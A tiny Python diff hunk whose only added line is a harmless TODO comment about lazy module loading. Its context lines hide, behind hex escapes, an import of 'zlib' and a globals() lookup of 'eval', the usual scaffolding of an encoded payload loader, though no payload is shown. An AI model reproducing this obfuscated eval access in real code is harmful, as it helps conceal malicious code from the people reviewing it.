@@ -3,3 +3,4 @@ __import__("""\x7a\x6c\x69\x62""")
 
 globals()['\x65\x76\x61\x6c']
 globals()[var]
+# TODO: sys.modules[__name__] = LazyModule(__name__, globals()["__file__"], _import_structure, module_spec=__spec__)
